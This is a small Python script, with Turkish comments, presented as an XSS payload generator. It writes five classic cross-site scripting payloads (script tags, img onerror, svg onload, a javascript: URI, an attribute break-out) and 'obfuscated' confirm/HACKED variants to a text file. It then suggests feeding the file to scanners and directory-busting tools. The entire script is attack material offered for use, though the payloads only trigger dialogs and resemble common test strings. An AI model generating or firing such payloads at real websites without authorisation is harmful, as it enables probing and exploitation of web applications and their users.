print("--- XSS PAYLOAD GENERATOR ---")

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>"
]

filename = "xss_payloads.txt"

with open(filename, "w") as f:
    for p in payloads:
        # Kodları karıştır (Obfuscation - Basit)
        obfuscated = p.replace("alert", "confirm").replace("XSS", "HACKED")
        f.write(p + "\n")
        f.write(obfuscated + "\n")

print(f"✅ 10 farklı XSS saldırı kodu '{filename}' dosyasına yazıldı.")
print("Bu dosyayı 'Directory Buster' veya 'Scanner' araçlarında kullanabilirsin.")